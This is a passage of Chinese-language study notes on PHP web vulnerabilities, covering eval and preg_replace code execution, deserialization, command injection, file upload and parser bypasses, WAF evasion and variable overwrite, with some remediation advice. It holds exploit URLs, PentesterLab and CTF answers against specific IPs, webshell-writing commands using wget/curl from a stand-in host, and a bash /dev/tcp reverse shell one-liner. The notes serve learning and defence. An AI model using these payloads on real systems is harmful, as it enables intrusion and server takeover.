		eval("\$ret = $data;");
		echo $ret;
		?>
	exp:
		http://www.jianshu.com/code_exection/1.php?data=phpinfo()
		http://www.jianshu.com/code_exection/1.php?data=1;phpinfo()
		http://www.jianshu.com/code_exection/1.php?data=${phpinfo()}
		
		2）strtolower('$data')
	demo:
		<?php
		$data = $_GET['data'];
		eval("\$ret = strtolower('$data');");
		echo $ret;
		?>
	exp:
		http://www.jianshu.com/code_exection/1.php?data=1');phpinfo();//
	
	3）strtolower(\"$data\")
	demo:
		<?php
		$data = $_GET['data'];
		eval("\$ret = strtolower(\"$data\");");
		echo $ret;
		?>
	exp:
	ttp://www.jianshu.com/code_exection/1.php?data=1");phpinfo();//
	http://www.jianshu.com/code_exection/1.php?data=${phpinfo()}
	
	4）strtolower(\"$data\")
	demo:
		<?php
			$data = $_GET['data'];
			eval("\$ret = strtolower(\"$data\");");
			echo $ret;
		?>
	exp:
	http://www.jianshu.com/code_exection/1.php?data=");phpinfo();//
	http://www.jianshu.com/code_exection/1.php?data=${phpinfo()}

	5）preg_replace('/<data>(.*)<\/data>/e','$ret = "\\1"',$data)
	demo：
			mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])
		/e修正符使preg_replace()将replacement参数当作PHP 代码(在适当的逆向引用替换完之后)

		<?php
			$data = $_GET['data'];
			// echo $data;
			preg_replace('/<data>(.*)<\/data>/e','$ret = "\\1"',$data);
			echo $ret;
		?>
	exp：
	http://www.jianshu.com/code_exection/1.php?data=<data>${phpinfo()}</data>

		
	}

	反序列化漏洞
	{
		定义：
		{
			序列化：使用函数serialize()可将实例序列化为字符串
			反序列化：使用函数unserialize()可将序列化的字符串还原
		}
		
		代码
		{
			服务器端：
				<?php class foo{ public $file = "test.txt"; public $data = "123456"; function __destruct(){ file_put_contents($this->file,$this->data); } } $d = $_REQUEST['str']; var_dump($d); echo "<br />"; $tc = unserialize(base64_decode($d)); var_dump($tc); ?>
			客户端：
				<?php class foo { public $?le = "test.txt"; public $data = "123456"; function __destruct() { ?le_put_contents($this->?le, $this->data); } } $f = new foo(); $f->?le = "xx.php"; $f->data = "<?php phpinfo(); ?>"; echo base64_encode(serialize($f)); ?>
				客户端可构造上文代码生成序列化后的字符串提交给服务端，服务端就会生成文件xx.php，内容为<b><?php phpinfo(); ?></b>：
			TzozOiJmb28iOjI6e3M6NDoiZmlsZSI7czo2OiJ4eC5waHAiO3M6NDoiZGF0YSI7czoxOToiPD9waHAgcGhwaW5mbygpOyA/PiI7fQ==
			O:3:"foo":2:{s:4:"file";s:6:"xx.php";s:4:"data";s:19:"<?php phpinfo(); ?>";}
		}
		
		序列化与反序列化
		{
			
			magic函数，magic函数命名是以符号__开头的
				__construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(), __sleep(), __wakeup(), __toString(), __invoke(), __set_state(), __clone(), and __autoload()。
			这些函数在某些情况下会自动调用，比如__construct当一个对象创建时被调用，__destruct当一个对象销毁时被调用，__toString当一个对象被当作一个字符串使用
			
			
		}
		
		
	}
	
	参考文章
	{
		http://www.jianshu.com/p/3f0cf18adbe7
	}
	
	pentesterlab之code_exec答案
	{
	example1:
		字符串连接符
		http://218.9.118.151:5677/codeexec/example1.php?name=hacker".phpinfo();//
		http://218.9.118.151:5677/codeexec/example1.php?name=hacker".phpinfo();$dummy="
		
		
	example2:		
	http://218.9.118.151:5677/codeexec/example2.php?order=id);}phpinfo();//
	
	example3:	
	preg_replace/e
	http://218.9.118.151:5677/codeexec/example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello%20lamer
	
	
	example4:
	assert()
	http://218.9.118.151:5677/codeexec/example4.php?name=hacker'.phpinfo().'
	
	http://218.9.118.151:5677/codeexec/example4.php?name=hacker'.show_source("/var/www/codeexec/example3.php") .'
	}
}		
		

命令执行
{

	原理：
	{
		应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，
		当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成系统命令执行攻击，这就是命令执行漏洞
	}

	常见函数：
	{
			PHP：system、exec、shell_exec、passthru、popen、proc_popen
			ASP：
			JSP：
			ASPX：
			JAVA:
	}

	常用命令
	{
		windows:
		ping 192.168.1.1
		dir
		systeminfo
		ver
		whoami
		net user
		netstat -ano
		ipconfig
		
		linux:
		ls
		ifconfig
		
	}
	利用条件：
	{
	1.应用调用行系统命令的函数
	2.将用户输入作为系统命令的参数拼接到了命令中
	3.没有对用户输入进行过滤或过滤不严
	}

	漏洞分类：
	{
	1.代码层过滤不严
	　　商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：
	　　system("/bin/program -arg $arg");
	2.系统的漏洞造成命令注入
	　　bash破壳漏洞(CVE-2014-6271)
	3.调用的第三方组件存在代码执行漏洞
	　　如WordPress中用来处理图片的ImageMagick组件
	　　JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）ThinkPHP命令执行
	}

	漏洞危害
	{
	1.继承web服务程序的权限去执行系统命令或读写文件
	2.反弹shell
	3.控制整个网站甚至控制服务器
	4.进一步内网渗透等
	}

	漏洞可能代码（以 system为例）
	{
	1.system("$arg"); //直接输入即可
	2.system("/bin/prog $arg"); //直接输入;ls
	3.system("/bin/prog -p $arg"); //和2一样
	4.system("/bin/prog --p=\"$arg\"); //可以输入";ls;"
	5.system("bin/prog --p='$arg'"); //可以输入';ls;'
	}

	获取webshell
	{
	要有写权限！
	1.得到当前或绝对路径（可以用pwd）
	2.写文件：
	　　用?cmd=echo "<?php ohoinfo()?>" > /var/www/html/info.php
	　　或?cmd=wget -O /var/www/html/info.php http://www.xx.com/phpinfo.txt
	　　或?cmd=curl http://www.xx.com/phpinfo.txt > /var/www/html/info.php
	}

	反弹shell
	{
	远程执行:nc -l -p 8888
	访问URL:?cmd=bash -i >& /dev/tcp/10.0.0.1/8888 0>&1
	}

	绕过技术
	{
	1.闭合命令',;,"
	2.管道符
	在linux上，上面的;也可以用|、||代替
	　　；前面的执行完执行后面的
	　　|是管道符，显示后面的执行结果
	　　||当前面的执行出错时执行后面的
	在windows上，不能用;可以用&、&&、|、||代替
	　　&前面的语句为假则直接执行后面的
	　　&&前面的语句为假直接出错，后面的也不执行
	　　|直接执行后面的语句
	　　||前面出错执行后面的 
	3.url编码换行绕过
	换行符：%0d%0a
	4.
	}

	漏洞修复
	{
	1.尽量少用执行命令的函数或者直接禁用
	2.参数值尽量使用引号包括
	3.在使用动态函数之前，确保使用的函数是指定的函数之一
	4.在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义。
	<?php
	　　$arg = $_GET['cmd'];
	　　// $arg = addslashes($arg);
	　　$arg = escapeshellcmd($arg); //拼接前就处理
	　　if($arg) {
	　　　　system("ls -al '$arg'");
	　　}
	?>
	}

	基于时间延迟的判断
	{
	1.在URL上cmd=xxxxxx后拼接||ping -i 30 127.0.0.1   (&)应用程序I ping -i 30 127.0.0.1 I
	可能过滤掉某些命令分隔符 可以换做下面的命令：
	I ping -n 30 127.0.0.1 I
	& ping -i 30 127.0.0.1 &
	& ping -n 30 127.0.0.1 &
	;ping 127.0.0.1 ;
	%0a ping -i 30 127.0.0.1 %0a ' ping 127.0.0.1 '
	2.发生延迟，说明程序可能易于受到命令注入的攻击，对尝试几次，确定不是因为网络延迟造成的，更改-i -n 数值，确定时间延迟是否随着提交的值发生变化。
	3.使用发现的所有可成功实施注入的字符串，尝试注入dir、ls
	4不能在浏览器直接看到回显，可将命令重定向到当前目录下的文件中并查看。或者用TFTP上传工具到服务器，用telnet和netcat建立反向shell，用mail通过SMTP发送结果给自己的计算机。
	5.查看自己的权限，可以提升自己权限，访问敏感数据或控制服务器。
	}

}


文件上传
{
	原理：
	{
		文件上传是Web应用中经常出现的功能,它允许用户上传文件到服务器并保存到特定位置。
		文件上传漏洞指攻击者利用程序缺陷绕过系统对文件的验证与处理策略将恶意程序上传到服务器并获得执行服务器端命令的能力。
		
		大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。

		当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。根据具体漏洞的差异，此处上传的脚本可以是正常后缀的PHP，ASP以及JSP脚本，也可以是篡改后缀后的这几类脚本。

			上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行；
			上传文件是WebShell时，攻击者可通过这些网页后门执行命令并控制服务器；
			上传文件是其他恶意脚本时，攻击者可直接执行脚本进行攻击；
			上传文件是恶意图片时，图片中可能包含了脚本，加载或者点击这些图片时脚本会悄无声息的执行；
			
			上传文件是伪装成正常后缀的恶意脚本时，攻击者可借助本地文件包含漏洞(Local File Include)执行该文件。
			如将bad.php文件改名为bad.doc上传到服务器，再通过PHP的include，include_once，require，require_once等函数包含执行。

	}
	
	造成恶意文件上传的原因主要有三种：
	{
		1.文件上传时检查不严。没有进行文件格式检查。一些应用仅仅在客户端进行了检查，而在专业的攻击者眼里几乎所有的客户端检查都等于没有检查，攻击者可以通过NC，Fiddler等断点上传工具轻松绕过客户端的检查。一些应用虽然在服务器端进行了黑名单检查，但是却可能忽略了大小写，如将.php改为.Php即可绕过检查；一些应用虽然在服务器端进行了白名单检查却忽略了%00截断符，如应用本来只允许上传jpg图片，那么可以构造文件名为xxx.php%00.jpg,其中%00为十六进制的0x00字符，.jpg骗过了应用的上传文件类型检测，但对于服务器来说，因为%00字符截断的关系，最终上传的文件变成了xxx.php。

		2.文件上传后修改文件名时处理不当。一些应用在服务器端进行了完整的黑名单和白名单过滤，在修改已上传文件文件名时却百密一疏，允许用户修改文件后缀。如应用只能上传.doc文件时攻击者可以先将.php文件后缀修改为.doc，成功上传后在修改文件名时将后缀改回.php。

		3.使用第三方插件时引入。好多应用都引用了带有文件上传功能的第三方插件，这些插件的文件上传功能实现上可能有漏洞，攻击者可通过这些漏洞进行文件上传攻击。如著名的博客平台WordPress就有丰富的插件，而这些插件中每年都会被挖掘出大量的文件上传漏洞。
	}
	
	漏洞利用
	{
		上传Web脚本程序，Web容器解释执行上传的恶意脚本。
		上传Flash跨域策略文件crossdomain.xml，修改访问权限(其他策略文件利用方式类似)。
		上传病毒、木马文件，诱骗用户和管理员下载执行。
		上传包含脚本的图片，某些浏览器的低级版本会执行该脚本，用于钓鱼和欺诈。
	}
	
	利用条件：
	{
		文件能通过前端和后端的过滤和文件处理.
		文件内容不会被改变,能够被正确的存储
		存储位置是在Web容器控制范围
		攻击者有权限访问存储目录
	}
	
	制作图片一句话命令
	{
		copy 1.jpg/b+2.php 1.jpg
		16进制编辑器
		
	}
	
	截断上传
	{
		一般都是通过文件名后缀检查。但是在某些时候，攻击者手动修改了上传过程中的POST包，在文件名后添加一个%00字节额，则可以截断某些函数对文件名的判断。因为在许多语言的函数中，比如在C、PHP等语言的常用字符串处理函数中，0x00被认为是终止符。受此影响的环境有Web应用和一些服务器。比如应用原本只允许上传JPG图片，那么可以构造文件名为xxx.php[\0].JPG,其中[\0]为十六进制的0x00字符，.JPG绕过了应用的上传文件类型判断；但对于服务器来说，此文件因为0x00字符截断的关系，最终却变成了xxx.php。
 
		1.客户端校验　　
		一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。
		　　判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png?www.myhack58.com后缀名的文件，而此时并没有发送数据包。

		客户端绕过　　
		可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。
		 
		 
		 
		2.服务端校验
		2.1 content-type字段校验　　

		文件类型绕过
		我们可以通过抓包，将content-type字段改为image/gif
		 
		 
		 2.2 文件头校验　　
		可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：
		（1）  .JPEG;.JPE;.JPG，”JPGGraphic File”
		（2）  .gif，”GIF 89A”
		（3）  .zip，”Zip Compressed”
		（4）  .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”
		 
		文件头绕过　　
		在木马内容基础上再加了一些文件信息，有点像下面的结构
		GIF89a

		2.3扩展名验证

		 MIME验证

		MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。 

		它是一个互联网标准，扩展了电子邮件标准，使其能够支持： 

		非ASCII字符文本；非文本格式附件（二进制、声音、图像等）；由多部分（multiple parts）组成的消息体；包含非ASCII字符的头信息（Header information）。 

		这个标准被定义在RFC 2045、RFC 2046、RFC 2047、RFC 2048、RFC 2049等RFC中。 MIME改善了由RFC 822转变而来的RFC 2822，这些旧标准规定电子邮件标准并不允许在邮件消息中使用7位ASCII字符集以外的字符。正因如此，一些非英语字符消息和二进制文件，图像，声音等非文字消息原本都不能在电子邮件中传输(MIME可以)。MIME规定了用于表示各种各样的数据类型的符号化方法。 此外，在万维网中使用的HTTP协议中也使用了MIME的框架，标准被扩展为互联网媒体类型。

		MIME的作用

		使客户端软件区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。 Web服务器使用MIME来说明发送数据的种类，Web客户端使用MIME来说明希望接收到的数据种类。

		 

		一个普通的文本邮件的信息包含一个头部分（To: From: Subject: 等等）和一个体部分（Hello Mr.,等等）。在一个符合MIME的信息中，也包含一个信息头并不奇怪，邮件的各个部分叫做MIME段，每段前也缀以一个特别的头。MIME邮件只是基于RFC 822邮件的一个扩展，然而它有着自己的RFC规范集。

		 

		头字段：MIME头根据在邮件包中的位置，大体上分为MIME信息头和MIME段头。（MIME信息头指整个邮件的头，而MIME段头只每个MIME段的头。）


		常见MIME类型

		wKioL1gPRduyysyVAADQDRB0IVw372.png


		mimntype判断

		 一般先判断内容的前十个字节，来判断文件类型，然后再判断后缀名。


		文件扩展名绕过

		前提：黑名单校验

		黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。

		绕过方法：

		（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类

		（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类

		能被解析的文件扩展名列表：

		jsp  jspx  jspf

		asp  asa cer aspx
				
	}
	
	解析漏洞
	{
		（一）IIS5.x-6.x解析漏洞
			使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。
 
			1.目录解析(6.0)
				形式：www.xxx.com/xx.asp/xx.jpg
				原理: 服务器默认会把.asp，.asp目录下的文件都解析成asp文件。
	 
			2.文件解析
				形式：www.xxx.com/xx.asp;.jpg
				原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。
				解析文件类型
 
				IIS6.0 默认的可执行文件除了asp还包含这三种 :
				/test.asa
				/test.cer
				/test.cdx
				 
		（二）apache解析漏洞
			漏洞原理
				Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.qwe.asd “.qwe”和”.asd” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.qwe.asd解析成php。
 
			漏洞形式
				www.xxxx.xxx.com/test.php.php123
 
			其余配置问题导致漏洞 
				（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。
				（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以php 方式执行。
				 
			修复方案
				1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入
				2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so
				把#号去掉，重启apache,在网站根目录下建立.htaccess文件

		（三）nginx解析漏洞
			漏洞原理
				Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：
 
				PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了
 
			漏洞形式
				www.xxxx.com/UploadFiles/image/1.jpg/1.php
				www.xxxx.com/UploadFiles/image/1.jpg%00.php
				www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php
				 
			另外一种手法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。
			
		（四）IIS7.5解析漏洞
			IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。

			
		(五)配合操作系统文件命令规则
			（1）上传不符合windows文件命名规则的文件名:
				test.asp.
				test.asp(空格)
				test.php:1.jpg
				test.php:: $DATA
				会被windows系统自动去掉不符合规则符号后面的内容。
				
		（六）配合文件包含漏洞
		前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。
		绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）
		（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；
		（2）然后再上传一个.php的文件，内容为“上传的txt文件路径”);?>
		此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：
		 
		（2）linux下后缀名大小写
		在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。

		 
		（七）CMS、编辑器漏洞
		（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。
		（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。
		这两方面的漏洞以后单独成文汇总，这里点到为止。
		 
		配合其他规则
		（1）0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候
		test.php(0x00).jpg
		test.php%00.jpg
		　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg

					
	}
	
	WAF绕过
	{
		1、 垃圾数据　　
		有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验

		当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。
		2、 filename
		针对早期版本安全狗，可以多加一个filename

		、3 POST/GET
		有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。
		此种情况可以上传一个POST型的数据包，抓包将POST改为GET。
	}
	
	漏洞防护
	{
		防范文件上传漏洞常见的几种方法。
		{
			1、文件上传的目录设置为不可执行
			只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。

			2、判断文件类型
			在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。

			3、使用随机数改写文件名和文件路径
			文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。

			4、单独设置文件服务器的域名
			由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。
		}
 
 
		系统开发阶段的防御
		{		
			系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统。在系统开发阶段应充分考虑系统的安全性。对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。
		}
		
		
		系统运行阶段的防御				
		{					系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。
		}
		
		
		安全设备的防御
		{	文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。目前华三通信公司发布的SecPath IPS系列产品经过长期的积累，不但可以基于行为对网络中大量文件上传漏洞的利用进行检测，同时还能基于内容对恶意文件进行识别
		}	
	}
	



}

变量覆盖
{
	定义：
	{
		变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击
		变量覆盖漏洞大多数由函数使用不当导致，经常引发变量覆盖漏洞的函数有：extract(),parse_str()和import_request_variables()
	}
	
	常见变量覆盖漏洞
	{
		1.全局变量覆盖
		{
			1)当register_global=ON时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等。
				<?php
				echo "Register_globals: ".(int)ini_get("register_globals")."<br/>";
				if ($auth){
				   echo "private!";
				}
				?>
			当register_globals=OFF时，这段代码不会出问题。
			但是当register_globals=ON时，提交请求URL：http://www.a.com/test.php?auth=1,变量$auth将自动得到赋值。得到的结果为
				Register_globals:1
				private!
			小记：如果上面的代码中，已经对变量$auth赋了初始值，比如$auth=0，那么即使在URL中有/test.php?auth=1，也不会将变量覆盖，也就是说不会打印出private！
			
			
			2)通过$GLOBALS获取的变量，也可能导致变量覆盖。
				<?php
				echo "Register_globals:".(int)ini_get("register_globals")."<br/>";
				if (ini_get('register_globals')) foreach($_REQUEST as $k=>$v) unset(${$k});
				print $a;
				print $_GET[b];
				?>
			变量$a未初始化，在register_globals=ON时，再尝试控制“$a”的值（http://www.a.com/test1.php?a=1&b=2），会因为这段代码而出错。
			而当尝试注入“GLOBALS[a]”以覆盖全局变量时（http://www.a.com/test1.php?GLOBALS[a]=1&b=2），则可以成功控制变量“$a”的值。这是因为unset()默认只会销毁局部变量，要销毁全局变量必须使用$GLOBALS。
			而在register_globals=OFF时，则无法覆盖到全局变量。
			小记：register_globals的意思是注册为全局变量，所以当On的时候，传递过来的值会被直接注册为全局变量而直接使用，当为OFF的时候，就需要到特定的数组中去得到它。
			unset用于释放给定的变量。
		}
		
		
		2.extract()变量覆盖
		{
			语法：extract(array,extract_rules,prefix) 
			demo:
				<?php
					$auth = '0';
					extract($_GET)；
					if($auth==1){
						echo "private!";
					}else{
						echo "public!";
					}
				?>
			
			分析：
				假设用户构造以下链接：http://www.a.com/test1.php?auth=1，界面上会打印出private！
				安全的做法是确定register_globals=OFF后，在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖。
				小记：PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。
		}
				
		3.遍历初始化变量
		{
			常见的一些以遍历的方式释放变量的代码，可能会导致变量覆盖。
				<?php
				$chs = '';
				if($_POST && $charset != 'utf-8'){
					$chs = new Chinese('UTF-8', $charset);
					foreach($_POST as $key => $value){
						$$key = $chs->Convert($value);
					}
					unset($chs);
				}
				?>

			若提交参数chs，则可覆盖变量"$chs"的值。
			小记：在代码审计时需要注意类似“$$k”的变量赋值方式有可能覆盖已有的变量，从而导致一些不可控制的结果。
		}
		
		4.import_request_variables变量覆盖
		{
			<?php
			$auth = '0';
			import_request_variables('G');

			if($auth == 1){
			  echo "private!";
			}else{
			  echo "public!";
			}
			?>

			当用户输入http://www.a.com/test1.php?auth=1时，网页上会输出private！
			import_request_variables('G')指定导入GET请求中的变量，从而导致变量覆盖。
			小记：import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。
		}
		
		5.parse_str()变量覆盖
		{
			//var.php?var=new
			$var='init';
			parse_str($_SERVER['QUERY_STRING']);
			print $var;

			与parse_str()类似的函数还有mb_parse_str()

			小记：parse_str — 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。
		
		}
	
	
	
	}
	
	
}

截断方式
{

}


php弱类型
{
	
}


php反序列化
{
序列化是将变量转换为可保存或传输的字符串的过程；反序列化就是在适当的时候把这个字符串再转化成原来的变量使用。这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。
{
1. serialize和unserialize函数
这两个是序列化和反序列化PHP中数据的常用函数。
<?php
$a = array('a' => 'Apple' ,'b' => 'banana' , 'c' => 'Coconut');
//序列化数组
$s = serialize($a);
echo $s;
//输出结果：a:3:{s:1:"a";s:5:"Apple";s:1:"b";s:6:"banana";s:1:"c";s:7:"Coconut";}
echo '<br /><br />';
//反序列化
$o = unserialize($s);
print_r($o);
//输出结果 Array ( [a] => Apple [b] => banana [c] => Coconut )
?>

当数组值包含如双引号、单引号或冒号等字符时，它们被反序列化后，可能会出现问题。为了克服这个问题，一个巧妙的技巧是使用base64_encode和base64_decode。
$obj = array();
//序列化
$s = base64_encode(serialize($obj)); 
//反序列化
$original = unserialize(base64_decode($s)); 

但是base64编码将增加字符串的长度。为了克服这个问题，可以和gzcompress一起使用。 
//定义一个用来序列化对象的函数
function my_serialize( $obj ) 
{ 
   return base64_encode(gzcompress(serialize($obj))); 
} 
//反序列化
function my_unserialize($txt) 
{ 
   return unserialize(gzuncompress(base64_decode($txt))); 
}


2. json_encode 和 json_decode

使用JSON格式序列化和反序列化是一个不错的选择： 

    使用json_encode和json_decode格式输出要serialize和unserialize格式快得多。
    JSON格式是可读的。
    JSON格式比serialize返回数据结果小。
    JSON格式是开放的、可移植的。其他语言也可以使用它。
$a = array('a' => 'Apple' ,'b' => 'banana' , 'c' => 'Coconut');
//序列化数组
$s = json_encode($a);
echo $s;
//输出结果：{"a":"Apple","b":"banana","c":"Coconut"}
echo '<br /><br />';
//反序列化
$o = json_decode($s);

3. var_export 和 eval
var_export 函数把变量作为一个字符串输出；eval把字符串当成PHP代码来执行，反序列化得到最初变量的内容。
$a = array('a' => 'Apple' ,'b' => 'banana' , 'c' => 'Coconut'); 
//序列化数组
$s = var_export($a , true);
echo $s;
//输出结果： array ( 'a' => 'Apple', 'b' => 'banana', 'c' => 'Coconut', )
echo '<br /><br />';
//反序列化
eval('$my_var=' . $s . ';');
print_r($my_var);

4. wddx_serialize_value 和 wddx deserialize
wddx_serialize_value函数可以序列化数组变量，并以XML字符串形式输出
$a = array('a' => 'Apple' ,'b' => 'banana' , 'c' => 'Coconut');
//序列化数组
$s = wddx_serialize_value($a);
echo $s;
//输出结果（查看输出字符串的源码）：<wddxPacket version='1.0'><header/><data><struct><var name='a'><string>Apple</string></var><var name='b'><string>banana</string></var><var name='c'><string>Coconut</string></var></struct></data></wddxPacket>
echo '<br /><br />';
//反序列化
$o = wddx_deserialize($s);
print_r($o);
//输出结果：Array ( [a] => Apple [b] => banana 1 => Coconut )
可以看出，XML标签字符较多，导致这种格式的序列化还是占了很多空间。


小结
上述所有的函数在序列化数组变量时都能正常执行，但运用到对象就不同了。例如json_encode序列化对象就会失败。反序列化对象时，unserialize和eval将有不同的效果。 
}


serialize和unserialize函数详解
{
声明一个对象
<?php  
class TestClass  
{  
    // 一个变量     
    public $variable = 'This is a string';    
    // 一个简单的方法    
    public function PrintVariable()  
    {  
        echo $this->variable;  
    }  
}  
   
// 创建一个对象   
$object = new TestClass();    
// 调用一个方法    
$object->PrintVariable();    
?> 
自名函数
{
如果PHP 5找不到__construct()函数，那么它将搜索一个与类名字相同的函数，这是PHP中编写构造器的老方法，这种方法中你只需要定义一个名字与类名相同的函数
<?php
class just4fun {
    var $enter;
    var $secret;
}
if (isset($_GET['pass'])) {
    $pass = $_GET['pass'];
    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }
    $o = unserialize($pass);
    if ($o) {
        $o->secret = "*";
        if ($o->secret === $o->enter)
            echo "Congratulation! Here is my secret: ".$o->secret;
        else 
            echo "Oh no... You can't fool me";
    }
    else echo "are you trolling?";
}
?>
poc:
<?php 
class just4fun {
    var $enter;
    var $secret;
    function just4fun()
    {
        $this->enter=&$this->secret;
    }
}
echo serialize(new just4fun());
?>
}
exp：http://115.28.150.176/php1/index.php?pass=O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}
magic函数，magic函数命名是以符号__开头的，比如 __construct, __destruct, __toString, __sleep, __wakeup等等。这些函数在某些情况下会自动调用
__construct在对象创建时调用，__destruct在php脚本结束时调用，__toString在对象被当作一个字符串使用时调用，__sleep magic方法在一个对象被序列化的时候调用；__wakeup magic方法在一个对象被反序列化的时候调用。

PHP中的一些魔幻函数：
